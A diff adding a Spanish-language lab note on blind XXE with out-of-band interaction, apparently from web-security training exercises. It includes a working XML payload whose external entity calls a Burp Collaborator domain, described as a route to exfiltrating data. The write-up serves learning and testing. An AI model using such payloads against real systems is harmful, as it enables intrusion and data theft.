@@ -130,7 +130,23 @@ El &xxe; llama a la entidad que definimos en el DTD
   Necesitariamos saber que esa IP tiene un endpoint que el servidor tiene acceso 
   
   
+# Blind XXE with out-of-band interaction
   
+  En este ejericio aunque se inyecte una entidad externa no regresa ningun cambio por lo cual probamos haciendo un ataque "vulnerabilidad al desencadenar interacciones fuera de banda con un dominio externo" usando el Burp Collaborator en donde lo que se inyecta intentara alcanzar el dominio que nos da el burp y por ahi podremos
+exfiliar informacion.
+  
+  ```
+  
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://ywycs7zj3x3yke65m5jfox94gvmlaa.oastify.com"> ]>
+<stockCheck>
+<productId>&xxe;</productId>
+<storeId>1</storeId>
+</stockCheck>
+
+  ```
+  
+ EL burp colaborator permite ver los logs tanto del http como de DNS "Debería ver algunas interacciones DNS y HTTP iniciadas por la aplicación como resultado de su carga útil."
   
   
 Referencias
